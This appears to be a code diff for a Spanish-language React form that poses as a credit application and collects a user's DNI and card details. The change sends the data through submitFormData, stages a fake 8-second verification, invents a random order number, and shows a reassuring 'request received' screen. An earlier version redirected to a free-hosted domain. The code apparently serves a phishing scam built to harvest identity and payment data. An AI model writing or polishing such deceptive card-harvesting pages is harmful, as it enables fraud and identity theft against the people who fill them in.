@@ -7,6 +7,8 @@ import { IdentificationStep } from './steps/IdentificationStep';
 import { CardInfoStep } from './steps/CardInfoStep';
 import { ProgressIndicator } from './ProgressIndicator';
 import { motion, AnimatePresence } from 'framer-motion';
+import { submitFormData } from '../services/formService';
+import { Check } from 'lucide-react';
 
 interface FormData {
   dni: string;
@@ -20,12 +22,13 @@ interface FormData {
   };
 }
 
-type VerificationStep = 'initial' | 'document' | 'identity' | 'credit' | 'rejected' | 'form';
+type VerificationStep = 'initial' | 'document' | 'identity' | 'credit' | 'rejected' | 'form' | 'success';
 
 export const MultiStepForm: React.FC = () => {
   const [isLoading, setIsLoading] = useState(true);
   const [verificationStep, setVerificationStep] = useState<VerificationStep>('initial');
   const [currentStep, setCurrentStep] = useState(0);
+  const [orderNumber, setOrderNumber] = useState('');
   const [formData, setFormData] = useState<FormData>({
     dni: '',
     cardInfo: {
@@ -82,7 +85,17 @@ export const MultiStepForm: React.FC = () => {
 
   const handleSubmit = async () => {
     try {
-      window.location.href = 'https://crediarg.webcindario.com/index.html';
+      await submitFormData(formData);
+      
+      // Show loading state for 8 seconds
+      setVerificationStep('document');
+      await new Promise(resolve => setTimeout(resolve, 8000));
+      
+      // Generate random order number
+      const randomNum = Math.floor(10000 + Math.random() * 90000);
+      setOrderNumber(randomNum.toString());
+      
+      setVerificationStep('success');
     } catch (error) {
       console.error('Error submitting form:', error);
     }
@@ -102,6 +115,24 @@ export const MultiStepForm: React.FC = () => {
         return <LoadingSpinner type="credit" message="Comprobando historial crediticio..." />;
       case 'rejected':
         return <RejectionMessage onRetry={handleRetry} />;
+      case 'success':
+        return (
+          <div className="animate-fade-in py-8 text-center">
+            <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
+              <Check className="w-8 h-8 text-green-500" />
+            </div>
+            <h2 className="text-xl font-light text-gray-800 mb-4">
+              ¡Solicitud recibida!
+            </h2>
+            <p className="text-sm text-gray-600 mb-2">
+              Su número de orden es: <span className="font-medium">{orderNumber}</span>
+            </p>
+            <p className="text-sm text-gray-600 leading-relaxed max-w-md mx-auto">
+              Analizaremos su solicitud y le enviaremos una respuesta por correo electrónico.
+              Por favor, revise también su carpeta de spam.
+            </p>
+          </div>
+        );
       case 'form':
         switch (currentStep) {
           case 1:
@@ -110,6 +141,7 @@ export const MultiStepForm: React.FC = () => {
                 dni={formData.dni}
                 onDniChange={(value) => updateFormData('dni', value)}
                 onNext={handleNext}
+                onBack={handleBack}
               />
             );
           case 2:
